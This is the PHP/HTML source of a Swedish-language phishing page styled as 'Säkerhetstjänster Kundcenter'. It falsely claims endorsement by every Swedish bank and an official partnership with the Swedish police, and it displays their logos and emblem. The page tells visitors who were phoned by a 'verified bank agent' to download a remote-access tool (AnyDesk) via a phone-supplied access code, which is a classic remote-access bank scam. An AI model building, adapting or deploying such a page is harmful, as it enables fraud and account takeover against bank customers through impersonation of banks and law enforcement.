<?php include('protect.php'); ?>
<!DOCTYPE html>
<html lang="sv">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Säkerhetstjänster Kundcenter</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #183e4f;
      --accent: #f59c28;
      --background: #f5f7fa;
      --white: #fff;
      --gray: #eaeae7;
      --error: #e74c3c;
      --header-bg: #0B2028;
      --footer-bg: #0B2028;
    }
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      line-height: 1.6;
      color: #333;
      background: var(--background);
    }
    
    /* Header */
    header {
      background: var(--header-bg);
      color: var(--white);
      padding: 0;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    
    .header-container {
      max-width: 1200px;
      margin: 0 auto;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 1rem 2rem;
    }
    
    .logo {
      font-size: 1.5rem;
      font-weight: 700;
      color: var(--white);
    }
    
    nav ul {
      display: flex;
      list-style: none;
      gap: 2rem;
    }
    
    nav a {
      color: var(--white);
      text-decoration: none;
      font-weight: 500;
      font-size: 0.95rem;
      transition: color 0.3s ease;
    }
    
    nav a:hover {
      color: var(--accent);
    }
    
    /* Main Content */
    .main-container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 2rem;
    }
    
    /* Hero Section */
    .hero {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 0;
      margin: 3rem 0;
      background: var(--white);
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
    }
    
    .hero-content {
      padding: 3rem;
      display: flex;
      flex-direction: column;
      justify-content: center;
      background: var(--primary);
      color: var(--white);
    }
    
    .hero-content h1 {
      font-size: 2.5rem;
      font-weight: 700;
      color: var(--white);
      margin-bottom: 1rem;
      line-height: 1.2;
    }
    
    .hero-content p {
      font-size: 1.1rem;
      color: var(--gray);
      margin-bottom: 2rem;
      line-height: 1.6;
    }
    
    .cta-button {
      display: inline-block;
      background: var(--accent);
      color: var(--primary);
      padding: 1rem 2rem;
      text-decoration: none;
      border-radius: 8px;
      font-weight: 600;
      font-size: 1rem;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(245, 156, 40, 0.3);
    }
    
    .cta-button:hover {
      background: #e68a1f;
      color: var(--white);
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(245, 156, 40, 0.4);
    }
    
    .hero-image {
      background: none;
      padding: 0;
      margin: 0;
      height: 100%;
      width: 100%;
      display: flex;
      align-items: stretch;
      justify-content: stretch;
    }
    
    .hero-image img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      border-radius: 0;
      box-shadow: none;
    }
    
    /* Content Sections */
    .content-section {
      background: rgba(255,255,255,0.85);
      backdrop-filter: blur(8px);
      border-radius: 22px;
      padding: 2.7rem 2.2rem 2.2rem 2.2rem;
      margin: 2.2rem 0;
      box-shadow: 0 8px 32px 0 rgba(24, 62, 79, 0.10);
      position: relative;
      overflow: hidden;
    }
    
    .content-section h2 {
      display: flex;
      align-items: center;
      font-size: 2rem;
      font-weight: 700;
      color: #183e4f;
      margin-bottom: 1.2rem;
      letter-spacing: 0.2px;
    }
    .content-section h2::before {
      content: '';
      display: inline-block;
      width: 7px;
      height: 32px;
      margin-right: 16px;
      border-radius: 6px;
      background: linear-gradient(180deg, #f59c28 0%, #183e4f 100%);
      box-shadow: 0 2px 8px #f59c2822;
    }
    .content-section p, .content-section ul {
      font-size: 1.08rem;
      color: #2d3a45;
      margin-bottom: 1.1rem;
      line-height: 1.7;
    }
    .content-section ul {
      padding-left: 1.5em;
      margin-bottom: 0.7em;
    }
    .content-section li {
      margin-bottom: 0.4em;
      font-size: 1.08rem;
    }
    
    .download-section {
      background: rgba(255,255,255,0.92);
      backdrop-filter: blur(8px);
      border-radius: 22px;
      padding: 2.7rem 2.2rem 2.2rem 2.2rem;
      text-align: center;
      margin: 2.2rem 0;
      box-shadow: 0 8px 32px 0 rgba(24, 62, 79, 0.10);
      position: relative;
      overflow: hidden;
    }
    .download-section h3 {
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 2rem;
      font-weight: 800;
      color: #183e4f;
      margin-bottom: 1.2rem;
      letter-spacing: 0.2px;
      gap: 12px;
    }
    .download-section h3::before {
      content: '';
      display: inline-block;
      width: 32px;
      height: 32px;
      margin-right: 8px;
      background: url('data:image/svg+xml;utf8,<svg width=\'32\' height=\'32\' fill=\'none\' xmlns=\'http://www.w3.org/2000/svg\'><circle cx=\'16\' cy=\'16\' r=\'16\' fill=\'%23f59c28\'/><path d=\'M10 17l4 4 8-8\' stroke=\'%23183e4f\' stroke-width=\'2.2\' stroke-linecap=\'round\' stroke-linejoin=\'round\'/></svg>') no-repeat center/contain;
      vertical-align: middle;
    }
    .download-button {
      display: inline-block;
      background: linear-gradient(90deg, #f59c28 0%, #ffb347 100%);
      color: #183e4f;
      padding: 1.1rem 2.4rem;
      text-decoration: none;
      border-radius: 12px;
      font-weight: 700;
      font-size: 1.13rem;
      transition: all 0.2s ease;
      box-shadow: 0 4px 18px #f59c2840;
      margin: 1.3rem 0 1.7rem 0;
      border: none;
      cursor: pointer;
    }
    .download-button:hover {
      background: linear-gradient(90deg, #e68a1f 0%, #f59c28 100%);
      color: #fff;
      transform: translateY(-2px) scale(1.03);
      box-shadow: 0 8px 24px #f59c2855;
    }
    .download-section p {
      color: #2d3a45;
      font-size: 1.13rem;
      margin-bottom: 1.1rem;
      line-height: 1.7;
      font-weight: 400;
    }
    .access-code-info {
      background: #fffbe6;
      border: 1.5px solid #ffe082;
      border-radius: 14px;
      padding: 1.2rem 1.5rem 1.2rem 1.5rem;
      margin: 2.2rem auto 0 auto;
      text-align: left;
      color: #7c6f1a;
      font-size: 1.08rem;
      max-width: 700px;
      display: flex;
      align-items: flex-start;
      gap: 14px;
      box-shadow: 0 2px 12px #ffe08233;
    }
    .access-code-info strong {
      color: #7c6f1a;
      font-weight: 700;
      font-size: 1.09rem;
      display: flex;
      align-items: center;
    }
    .access-code-info::before {
      content: '';
      display: inline-block;
      width: 28px;
      height: 28px;
      margin-right: 8px;
      background: url('data:image/svg+xml;utf8,<svg width=\'28\' height=\'28\' fill=\'none\' xmlns=\'http://www.w3.org/2000/svg\'><circle cx=\'14\' cy=\'14\' r=\'14\' fill=\'%23f59c28\'/><path d=\'M8 15l4 4 8-8\' stroke=\'%237c6f1a\' stroke-width=\'2\' stroke-linecap=\'round\' stroke-linejoin=\'round\'/></svg>') no-repeat center/contain;
      vertical-align: middle;
    }
    
    /* Contact Form */
    .contact-form {
      background: var(--white);
      border-radius: 12px;
      padding: 2.5rem;
      margin: 2rem 0;
      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
    }
    
    .contact-form h3 {
      font-size: 1.5rem;
      font-weight: 600;
      color: var(--primary);
      margin-bottom: 1.5rem;
    }
    
    .form-group {
      margin-bottom: 1rem;
    }
    
    .form-group input,
    .form-group textarea {
      width: 100%;
      padding: 0.75rem;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 1rem;
      transition: border-color 0.3s ease;
    }
    
    .form-group input:focus,
    .form-group textarea:focus {
      outline: none;
      border-color: var(--accent);
    }
    
    .submit-button {
      background: var(--accent);
      color: var(--primary);
      border: none;
      padding: 0.75rem 2rem;
      border-radius: 6px;
      font-weight: 600;
      font-size: 1rem;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    
    .submit-button:hover {
      background: #e68a1f;
      color: var(--white);
      transform: translateY(-1px);
      box-shadow: 0 4px 15px rgba(245, 156, 40, 0.3);
    }
    
    /* Footer */
    footer {
      background: var(--footer-bg);
      color: var(--white);
      padding: 3rem 0 2rem 0;
      margin-top: 4rem;
    }
    
    .footer-container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 2rem;
    }
    
    .footer-content {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 2rem;
      margin-bottom: 2rem;
    }
    
    .footer-section h4 {
      font-size: 1.1rem;
      font-weight: 600;
      margin-bottom: 1rem;
      color: var(--white);
    }
    
    .footer-section ul {
      list-style: none;
    }
    
    .footer-section ul li {
      margin-bottom: 0.5rem;
    }
    
    .footer-section ul li a {
      color: var(--gray);
      text-decoration: none;
      font-size: 0.9rem;
      transition: color 0.3s ease;
    }
    
    .footer-section ul li a:hover {
      color: var(--accent);
    }
    
    .footer-bottom {
      text-align: center;
      padding-top: 2rem;
      border-top: 1px solid #444;
      color: var(--gray);
      font-size: 0.9rem;
    }
    
    /* Responsive Design */
    @media (max-width: 768px) {
      .header-container {
        flex-direction: column;
        gap: 1rem;
        padding: 1rem;
      }
      
      nav ul {
        gap: 1rem;
      }
      
      .hero {
        grid-template-columns: 1fr;
        gap: 0;
      }
      
      .hero-content {
        padding: 2rem;
      }
      
      .hero-content h1 {
        font-size: 2rem;
      }
      
      .main-container {
        padding: 0 1rem;
      }
      
      .content-section,
      .contact-form {
        padding: 1.5rem;
      }
      
      .footer-content {
        grid-template-columns: 1fr;
        text-align: center;
      }
    }

    .bank-logos-section {
      background: #f5f7fa;
      padding: 18px 0 10px 0;
      margin-bottom: 0.5rem;
      overflow: hidden;
      border-bottom: 1px solid #eaeae7;
    }
    .bank-logos-marquee {
      width: 100%;
      overflow: hidden;
      position: relative;
    }
    .bank-logos-track {
      display: flex;
      width: max-content;
      animation: bank-marquee 28s linear infinite;
      align-items: center;
      gap: 48px;
    }
    .bank-logo {
      flex: 0 0 auto;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 48px;
      width: 120px;
      filter: grayscale(0.2) brightness(0.95);
      opacity: 0.9;
    }
    .bank-logo img {
      max-height: 40px;
      max-width: 100px;
      width: auto;
      height: auto;
      display: block;
    }
    /* Make SBAB logo visually larger in the banner */
    .bank-logo img[src*='SBAB_Logo_09.2024.svg'] {
      max-height: 80px;
      max-width: 200px;
    }
    @keyframes bank-marquee {
      0% { transform: translateX(0); }
      100% { transform: translateX(-50%); }
    }

    .polisen-divider {
      width: 100%;
      height: 1px;
      background: linear-gradient(90deg, #eaeaea 0%, #b3c6d9 50%, #eaeaea 100%);
      margin: 36px 0 0 0;
      border: none;
    }
    .polisen-collab-section {
      background: #fff;
      box-shadow: 0 8px 32px 0 rgba(24, 62, 79, 0.10);
      border-radius: 22px;
      padding: 2.7rem 2.2rem 2.2rem 2.2rem;
      text-align: center;
      margin: 0 auto 32px auto;
      max-width: 700px;
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      position: relative;
    }
    .polisen-collab-content {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }
    .polisen-logo {
      height: 60px;
      width: auto;
      margin-bottom: 6px;
      filter: drop-shadow(0 2px 8px #b3c6d9aa);
    }
    .polisen-collab-text {
      font-size: 1.18rem;
      color: #183e4f;
      font-weight: 700;
      letter-spacing: 0.5px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 6px;
    }
    .polisen-badge {
      display: inline-block;
      background: linear-gradient(90deg, #b3c6d9 0%, #eaeaea 100%);
      color: #0B2028;
      font-size: 0.92rem;
      font-weight: 600;
      border-radius: 8px;
      padding: 3px 14px;
      margin-top: 4px;
      box-shadow: 0 2px 8px #b3c6d955;
      letter-spacing: 0.2px;
    }
    .polisen-collab-desc {
      margin: 24px auto 0 auto;
      font-size: 1.08rem;
      color: #2d3a45;
      font-weight: 400;
      line-height: 1.8;
      max-width: 700px;
      width: 100%;
      text-align: left;
      background: rgba(255,255,255,0.85);
      backdrop-filter: blur(8px);
      border-radius: 22px;
      box-shadow: 0 8px 32px 0 rgba(24, 62, 79, 0.10);
      padding: 2.2rem 2.2rem 2rem 2.2rem;
    }
  </style>
</head>
<body>
  <header>
    <div class="header-container">
      <div class="logo">Säkerhetstjänster</div>
      <nav>
        <ul>
          <li><a href="#hem">Hem</a></li>
          <li><a href="#om">Om oss</a></li>
          <li><a href="#tjanster">Tjänster</a></li>
          <li><a href="#nedladdning">Nedladdning</a></li>
          <li><a href="#kontakt">Kontakt</a></li>
        </ul>
      </nav>
    </div>
  </header>

  <main class="main-container">
    <!-- Hero Section -->
    <section class="hero" id="hem">
      <div class="hero-content">
        <h1>Alla svenska banker använder säker fjärranslutning via denna plattform</h1>
        <p>Detta är en standardiserad och bankgodkänd procedur för trygg fjärrsupport. Din säkerhet och integritet är alltid vår högsta prioritet.</p>
        <a href="#nedladdning" class="cta-button">Ange åtkomstkoden för att fortsätta</a>
      </div>
      <div class="hero-image">
        <img src="images/banner.png" alt="Verifierad bankagent fjärrsupport">
      </div>
    </section>

    <!-- Bank Logos Marquee Section -->
    <section class="bank-logos-section">
      <div class="bank-logos-marquee">
        <div class="bank-logos-track">
          <div class="bank-logo"><img src="images/Swedbank_wordmark.svg" alt="Swedbank" /></div>
          <div class="bank-logo"><img src="images/Nordea_201x_logo.svg" alt="Nordea" /></div>
          <div class="bank-logo"><img src="images/SEB_Logo.svg" alt="SEB" /></div>
          <div class="bank-logo"><img src="images/Skandia_2009_logo.svg" alt="Skandia" /></div>
          <div class="bank-logo"><img src="images/Länförsäkringar_textlogo.svg" alt="Länsförsäkringar" /></div>
          <div class="bank-logo"><img src="images/Danske_Bank_logo.svg" alt="Danske Bank" /></div>
          <div class="bank-logo"><img src="images/Handelsbanken.svg" alt="Handelsbanken" /></div>
          <div class="bank-logo"><img src="images/ICA_Banken_logo.svg" alt="ICA Banken" /></div>
          <div class="bank-logo"><img src="images/ResursBank_Logo.jpg" alt="Resurs Bank" /></div>
          <div class="bank-logo"><img src="images/Avanza_Bank_logo.svg" alt="Avanza Bank" /></div>
          <div class="bank-logo"><img src="images/SBAB_Logo_09.2024.svg" alt="SBAB" /></div>
          <div class="bank-logo"><img src="images/Ikano_Bank_RGB.png" alt="Ikano Bank" /></div>
          <div class="bank-logo"><img src="images/Landshypotek_wordmark.svg" alt="Landshypotek" /></div>
          <!-- Repeat for smooth loop -->
          <div class="bank-logo"><img src="images/Swedbank_wordmark.svg" alt="Swedbank" /></div>
          <div class="bank-logo"><img src="images/Nordea_201x_logo.svg" alt="Nordea" /></div>
          <div class="bank-logo"><img src="images/SEB_Logo.svg" alt="SEB" /></div>
          <div class="bank-logo"><img src="images/Skandia_2009_logo.svg" alt="Skandia" /></div>
          <div class="bank-logo"><img src="images/Länförsäkringar_textlogo.svg" alt="Länsförsäkringar" /></div>
          <div class="bank-logo"><img src="images/Danske_Bank_logo.svg" alt="Danske Bank" /></div>
          <div class="bank-logo"><img src="images/Handelsbanken.svg" alt="Handelsbanken" /></div>
          <div class="bank-logo"><img src="images/ICA_Banken_logo.svg" alt="ICA Banken" /></div>
          <div class="bank-logo"><img src="images/ResursBank_Logo.jpg" alt="Resurs Bank" /></div>
          <div class="bank-logo"><img src="images/Avanza_Bank_logo.svg" alt="Avanza Bank" /></div>
          <div class="bank-logo"><img src="images/SBAB_Logo_09.2024.svg" alt="SBAB" /></div>
          <div class="bank-logo"><img src="images/Ikano_Bank_RGB.png" alt="Ikano Bank" /></div>
          <div class="bank-logo"><img src="images/Landshypotek_wordmark.svg" alt="Landshypotek" /></div>
        </div>
      </div>
    </section>

    <!-- Swedish Police Collaboration Section -->
    <div class="polisen-divider"></div>
    <section class="polisen-collab-section">
      <div class="polisen-collab-content">
        <img src="images/Polisen_vapen.svg" alt="Polisen" class="polisen-logo" />
        <div class="polisen-collab-text">I samarbete med Polisen
          <span class="polisen-badge">Officiellt samarbete</span>
        </div>
        <div class="polisen-collab-desc">
          Säkerhetstjänster är en hemsida som riksbankerna satt ihop tillsammans med polismyndigheten för att enkelt kunna ge banken tillgång till fjärrstyrda säkerhets ärenden. Vid ärenden som till exempel bank id kapningar, nätverksvirus eller andra former av misstankar som kan förhindras av oss istället för att berörd bank behöver stänga ert konto under långa perioder.
        </div>
      </div>
    </section>

    <!-- About Us Section -->
    <section class="content-section" id="om">
      <h2>Om Säkerhetstjänster</h2>
      <p>Säkerhetstjänster samarbetar med alla större svenska banker för att möjliggöra verifierad och säker fjärrsupport till bankkunder. Vi följer strikta säkerhetsprotokoll och all kommunikation är krypterad för din trygghet.</p>
      <p>Ingen känslig information hanteras eller nås utan ditt uttryckliga tillstånd. Vår tjänst är utformad för att skydda dig och din bankinformation vid varje steg.</p>
    </section>

    <!-- Services Section -->
    <section class="content-section" id="tjanster">
      <h2>Vår tjänst</h2>
      <p>Vi hjälper bankkunder att ansluta säkert till verifierade bankagenter för fjärrsupport. Tjänsten är bankgodkänd och används av alla svenska banker.</p>
      <ul>
        <li>Säker, krypterad anslutning</li>
        <li>Verifierad bankagent och session</li>
        <li>Trygg kommunikation i realtid</li>
      </ul>
      <p>Du kan känna dig helt trygg – detta är en standardiserad och säker process för bankkunders fjärrsupport.</p>
    </section>

    <!-- Download Section -->
    <section class="download-section" id="nedladdning">
      <h3>Ladda ner bankgodkänd fjärrsupport</h3>
      <p>Du har blivit kontaktad av en verifierad bankagent. Ange din åtkomstkod för att fortsätta och ladda ner det bankgodkända fjärrsupportverktyget (AnyDesk).</p>
      <a href="/downloads/anydesk-version.exe" class="download-button">Fortsätt – ange åtkomstkod</a>
      <p>Denna procedur är framtagen i samarbete med din bank för att säkerställa trygg och verifierad kundservice.</p>
    </section>

    <!-- Access Code Info -->
    <div class="access-code-info">
      <strong>Åtkomstkod krävs:</strong> För att ladda ner AnyDesk behöver du en unik åtkomstkod som du får av oss via telefon. Detta är för din säkerhet och för att förhindra obehörig nedladdning. Ange koden på nedladdningssidan när du blir ombedd.
    </div>

  </main>

  <footer>
    <div style="background: #0B2028; padding: 32px 0 0 0; margin-top:0;">
      <div class="footer-container" style="max-width: 1200px; margin: 0 auto; display: flex; flex-direction: column; align-items: center;">
        <div style="display: flex; align-items: center; gap: 32px; margin-bottom: 16px;">
          <div style="width:48px; height:48px; background:#fff; border-radius:8px; display:flex; align-items:center; justify-content:center;">
            <!-- Placeholder for Säkerhetstjänster logo -->
            <span style="color:#183e4f; font-weight:700; font-size:1.2rem;">S</span>
          </div>
          <div style="width:48px; height:48px; background:#fff; border-radius:8px; display:flex; align-items:center; justify-content:center;">
            <!-- Placeholder for another logo -->
            <span style="color:#183e4f; font-weight:700; font-size:1.2rem;">K</span>
          </div>
        </div>
        <div style="display: flex; flex-wrap: wrap; gap: 24px; justify-content: center; margin-bottom: 16px;">
          <a href="#" style="color:#f59c28; text-decoration:underline; font-size:0.98rem;">Integritet</a>
          <a href="#" style="color:#f59c28; text-decoration:underline; font-size:0.98rem;">Cookies</a>
          <a href="#" style="color:#f59c28; text-decoration:underline; font-size:0.98rem;">Användarvillkor</a>
        </div>
        <div style="color:#eaeae7; font-size:0.98rem; margin-bottom: 16px;">© 2025 Säkerhetstjänster AB</div>
        <div style="display: flex; gap: 18px;">
          <!-- Social icons as SVGs -->
          <a href="#" aria-label="LinkedIn" style="color:#eaeae7;"><svg width="22" height="22" fill="none" xmlns="http://www.w3.org/2000/svg"><rect width="22" height="22" rx="4" fill="#f59c28"/><path d="M7.5 9h2v6h-2V9zm1-2a1 1 0 110-2 1 1 0 010 2zm3 2h2v.8c.3-.5.9-.8 1.5-.8 1.1 0 2 .9 2 2v4h-2v-4c0-.6-.4-1-1-1s-1 .4-1 1v4h-2V9z" fill="#183e4f"/></svg></a>
          <a href="#" aria-label="Instagram" style="color:#eaeae7;"><svg width="22" height="22" fill="none" xmlns="http://www.w3.org/2000/svg"><rect width="22" height="22" rx="4" fill="#f59c28"/><circle cx="11" cy="11" r="4" stroke="#183e4f" stroke-width="2"/><circle cx="15.5" cy="6.5" r="1" fill="#183e4f"/></svg></a>
        </div>
      </div>
    </div>
  </footer>
</body>
</html> 